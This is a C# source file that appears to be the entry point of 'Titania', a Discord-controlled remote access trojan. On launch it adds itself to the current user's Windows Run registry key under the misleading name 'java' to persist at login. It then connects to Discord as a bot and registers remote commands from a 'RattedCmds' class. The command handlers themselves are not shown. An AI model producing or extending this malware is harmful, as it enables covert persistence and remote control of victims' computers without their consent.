using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Titania.Logging;
using DSharpPlus;
using DSharpPlus.CommandsNext;
using Microsoft.Win32;
using System.Windows.Forms;

namespace Titania
{
    internal class Program
    {
        
        public static DiscordClient discord;
        static void Main(string[] args)
        {
           

            MainAsync(args).ConfigureAwait(false).GetAwaiter().GetResult();
           
        }
        static async Task MainAsync(string[] args)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            registryKey.SetValue("java", Application.ExecutablePath);
            Titania.Logging.MainLogger.Titania();
            discord = new DiscordClient(new DiscordConfiguration
            {
                Token = "",
                TokenType = TokenType.Bot
            });
           
            var commands = discord.UseCommandsNext(new CommandsNextConfiguration()
            {
                StringPrefixes = new[] { "+" }
            });
            commands.RegisterCommands<Rat.RattedCmds>();
      


            await discord.ConnectAsync();

            await Task.Delay(-1);

        }
    }
}
